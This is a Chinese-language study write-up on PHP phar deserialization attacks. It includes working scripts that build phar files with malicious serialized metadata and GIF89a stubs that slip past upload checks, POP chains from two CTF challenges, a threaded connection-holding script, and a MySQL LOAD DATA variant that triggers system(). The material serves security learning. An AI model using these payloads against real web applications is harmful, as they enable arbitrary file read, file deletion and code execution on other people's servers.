# 引言

PHP反序列化常见的是使用`unserilize()`进行反序列化，除此之外还有其它的反序列化方法，不需要用到`unserilize()`。就是用到了本文的主要内容——phar反序列化。很多大佬都进行过总结，但是看了这个知识点的比较全的内容。我看了不下二十篇文章，最后写此文为方便自己以后查看。

# Phar相关基础

Phar是将php文件打包而成的一种压缩文档，类似于Java中的jar包。它有一个特性就是phar文件会以序列化的形式储存用户自定义的`meta-data`。以扩展反序列化漏洞的攻击面，配合`phar://`协议使用。

## Phar文件结构

1.  `a stub`是一个文件标志，格式为 ：`xxx<?php xxx;__HALT_COMPILER();?>`。
    
2.  `manifest`是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。
    
3.  `contents`是被压缩的内容。
    
4.  `signature`签名，放在文件末尾。
    

就是这个文件由四部分组成，每种文件都是有它独特的一种文件格式的，有首有尾。而`__HALT_COMPILER();`就是相当于图片中的文件头的功能，没有它，图片无法解析，同样的，没有文件头，php识别不出来它是phar文件，也就无法起作用。

## 生成phar文件

这里测试一下~  
前提：生成phar文件需要修改php.ini中的配置，将`phar.readonly`设置为`Off`  
![](_v_images/9441910240871.jpeg)

```
<?php 
class test{
	public $name='phpinfo();';
}
$phar=new phar('test.phar');//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub
$obj=new test();
$phar->setMetadata($obj);//自定义的meta-data存入manifest
$phar->addFromString("flag.txt","flag");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

生成的phar文件，打开该文件可以看到文件头是`<?php __halt_compiler(); ?>`以及中间的部分内容是序列化的形式存在于这个文件中。  
![](_v_images/7401910215852.jpeg)

该方法在文件系统函数（`file_exists()`、`is_dir()`等）参数可控的情况下，配合phar://伪协议，可以不依赖`unserialize()`直接进行反序列化操作。  
[https://paper.seebug.org/680/](https://paper.seebug.org/680/)得知：有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过`phar://`伪协议解析phar文件时，都会将`meta-data`进行反序列化，测试后受影响的函数如下：(仿照大佬的图)  
![](_v_images/5351910242328.jpeg)  
这里使用`file_get_contents()`函数来进行实验。

```
<?php
class test{
    public $name='';
    public function __destruct()
    {
        eval($this->name);
    }
}

echo file_get_contents('phar://test.phar/flag.txt');
?>
```

![](_v_images/3301910216046.jpeg)  
`__HALT_COMPILER();`必须大写，小写不会被识别出来。导致无法进行反序列化操作。  
因为考虑到在上传的时候，可能只会允许上传图片(`jpg/png/gif`)，上传时将test.phar修改文件扩展名为jpg也可以进行反序列化，不会影响解析。  
如果对文件头有识别的，也可以使用GIF文件头`GIF89a`来绕过检测，具体操作与文件上传部分细节类似，不再赘述。

# CTF题目实战

## Dropbox

登录注册功能，注册了一个账号，然后进行登录。发现只有一个上传功能，所以就随意上传一个文件，但是发现只能上传图片。  
![](_v_images/1241910227754.jpeg)  
所以这里上传一个普通图片来测试。  
上传成功后存在下载和删除功能，下载发现进行了跳转，并且浏览器不回显，这里抓包查看

![](_v_images/599201810234142.jpeg)  
可能存在文件读取，这里尝试一下  
![](_v_images/596141810213295.jpeg)  
但是无法读取`flag.php`所以还需要尝试其他办法，这里读取网站源码，进行查看。

```
#download.php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp");

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```

```
#delete.php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```

```
#class.php
#代码过长，选取重要部分
<?php
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
class User {
    public $db;
    public function __construct() {
        global $db;
        $this->db = $db;
    }
    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;
    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);
        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);
        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }
    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }
}

class File {
    public $filename;
    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```

这里需要提一下利用条件

1.  phar文件能够上传至服务器
    
2.  要有可利用的魔术方法
    
3.  文件操作函数的参数可控，且:、`/`、`phar`等特殊字符没有被过滤
    

文件上传功能允许上传文件，修改phar文件后缀即可。魔术方法则在delete文件中有`unlink()`以及`file_get_contents()`和`__call()`等，文件操作函数的参数，`filename`可控，且无过滤。  
现在捋一下整个逻辑，这里是可以进行任意文件读取，且`delete`也可以进行任意文件删除(PS:测试将`index.php`删了，无奈只能重启靶机)，  
代码逻辑，在`class.php`中的`User`类中，有一个`close`方法，`__destruct`执行触发该`close`方法,将该`close`方法改为`FileList`的一个对象，且`file`类中也有一个`close`方法，它负责是的读取文件`file_get_contents()`函数。  
构造pop链的逻辑，读取文件的话，可以使`User`类中的`__construct()`实例化一个`FileList`对象。然后向下执行，`FileList`中没有`close`函数，所以就能触发`__call()`函数，然后再执行`close`方法（注意此时是File中的`close`方法）只需控制`filename`的值即可成功执行`file_get_contents()`函数进行读取文件。

```
<?php
class User{
    public $db;
    public function __construct(){
        $this->db = new FileList();
    }
}
class FileList{
    private $files;
    private $results;
    private $funcs;
    public function __construct(){
        $this->files = array(new File());
        $this->results = array();
        $this->funcs = array();
    }
}
class File{
    public $filename = '/flag.txt';
}
$user = new User();
@unlink("m0re.phar");
$phar=new phar('m0re.phar');//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");//设置stub
$phar->setMetadata($user);//自定义的meta-data存入manifest
$phar->addFromString("f1ag.txt","f1ag");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

上传并删除抓包，  
![](_v_images/594061810227331.jpeg)

## Baby^h Master PHP

这个题目可是很经典的了。  
直接给出源码，会看到当前目录，在沙盒当中，全局查看代码，两个类`Admin&User`，且Admin类继承了User类，三个函数，分别为三种功能，`upload`和`show`还有`check_session`  
然后看用户可以控制的输入部分

```
$mode = $_GET["m"];
if ($mode == "upload") {
    upload(check_session());
} else if ($mode == "show") {
    show(check_session());
} else {
    echo "IP:".$_SERVER["REMOTE_ADDR"];
    echo "Sandbox:"."/var/www/data/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    highlight_file(__FILE__);
}
```

输入可以有两种模式，一种是upload，一种是show。  
关于upload函数

```
function upload($path) {
    $data = file_get_contents($_GET["url"] . "/avatar.gif");
    if (substr($data, 0, 6) !== "GIF89a") {
        die("Fuck off");
    }

    file_put_contents($path . "/avatar.gif", $data);
    die("Upload OK");
}
```

接受输入的一个URL，并访问，`url/avatar.gif`然后保存到本地。并且检验该文件是否为GIF，通过的手法是对比判断文件头，看数据中的前六个字母是否符合GIF标志(这个很容易绕过)。  
而show函数，则是读取上传的文件的功能。  
还有一个知识点就是匿名函数，关于PHP的匿名函数，介绍是：临时创建一个没有指定名称的函数  
比如

```
<?php
$greet = function($name)
{
    printf("Hello %s\r\n", $name);
};

$greet('World');
$greet('PHP');
?>
#Hello World
#Hello PHP
```

题目中的Admin类中就是存在一个这样的匿名函数

```
class Admin extends User {
    function __destruct() {
        $random = bin2hex(openssl_random_pseudo_bytes(32));
        eval("function my_function_$random() {"
            . "  global \$FLAG; \$FLAG();"
            . "}");
        $_GET["lucky"]();
    }
}
```

关于`bin2hex(openssl_random_pseudo_bytes(32))`  
一个函数

```
openssl_random_pseudo_bytes( int $length [, bool &$crypto_strong ] )
```

`openssl_random_pseudo_bytes`\- 生成一个伪随机字节串,字节数由 length 参数指定。 通过 crypto\_strong 参数可以表示在生成随机字节的过程中是否使用了强加密算法。返回值为FALSE的情况很少见，但已损坏或老化的有些系统上会出现。  
![](_v_images/592031810232751.jpeg)  
bin2hex将生成的随即字节串转换成十六进制。  
然后分析整个逻辑：由内向外看，`upload`和`show`都使用了`check_session`函数，这个函数，取出`cookie`中的`session-data`：

```
O%3A4%3A%22User%22%3A1%3A%7Bs%3A6%3A%22avatar%22%3Bs%3A46%3A%22%2Fvar%2Fwww%2Fdata%2F3054b012b7bb1e3093bb723f95a6a055%22%3B%7D-----6234845ec46a27cb6535a24307809d88f700d915
```

其中`data`为`User`类序列化的内容，`hmac`是经过`hash_hmac("sha1", $data, $SECRET)`处理后的，拼接在一起就是`session-data`然后后面三个if语句则是匹配cookie中的这些数据是否相同，相同就进行反序列化，并且返回它的属性avatar  
然后就是upload模式，验证url是否存在，如果存在则上传avatar.gif并覆盖。最后执行Admin类中的随机函数，这个随机函数的名字，这里看大佬的解释是查看`create_function`函数对应的内核源，暂时理解不来。只知道匿名函数并非是没有名字的，而是`%00lambda_%d`其中`%d`为数字，为当前进程的第n个匿名函数。  
然后还有apache2的工作模式，默认是prefork  
prefork是一个非线程型的、预派生的MPM，使用多个进程，每个进程在某个确定的时间只单独处理一个连接，效率高，但内存使用比较大。  
![](_v_images/589971810216750.jpeg)  
然后就是解题了：  
先生成Admin类的phar文件

```
<?php
class Admin{
    public $avatar='flag';
}
$a = new Admin();

$phar = new Phar('test.phar',0,'test.phar');
$phar->startBuffering();
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');


$phar->setMetadata($a);
$phar->addFromString('text.txt','test');
$phar->stopBuffering();
```

重命名为`avatar.gif`后上传服务器，进行upload操作。  
![](_v_images/587911810222536.jpeg)  
最后进行最后一步爆破匿名函数

```
#fork.py
# coding: UTF-8
# Author: orange@chroot.org
# 

import requests
import socket
import time
from multiprocessing.dummy import Pool as ThreadPool
try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

def run(i):
    while 1:
        HOST = '题目地址'
        PORT = 80
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.sendall('GET / HTTP/1.1\nHost: your_vps_ip\nConnection: Keep-Alive\n\n')
        # s.close()
        print 'ok'
        time.sleep(0.5)

i = 8
pool = ThreadPool( i )
result = pool.map_async( run, range(i) ).get(0xffff)
```

# 扩展内容

## mysql 反序列化函数\_利用phar协议造成php反序列化

php调用mysql的语句`LOAD DATA LOCAL INFILE`导入phar文件也能触发phar中的反序列化语句  
`LOAD DATA LOCAL INFILE`这条语句是批量向表中插入文件中的内容

```
LOAD DATA LOCAL INFILE 'd:\\phpStudy\\WWW\\m0re\\user.txt' INTO TABLE users;
```

前提：在`my.ini`中添加

```
local-infile=1
secure_file_priv=""
```

![](_v_images/585871810235839.jpeg)  
成功插入  
![](_v_images/582831810243652.jpeg)

利用方式

```
<?php
class A {
    public $s = '';
    public function __wakeup () {
        system($this->s);
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'test', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/flag.txt\' INTO TABLE users  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
```

# Reference

[https://paper.seebug.org/680/](https://paper.seebug.org/680/)  
[https://cbatl.gitee.io/2020/08/11/phar/](https://cbatl.gitee.io/2020/08/11/phar/)  
[反序列化攻击面拓展提高篇](https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/)  
[apache的三种工作模式](https://www.cnblogs.com/qiujun/p/6861773.html)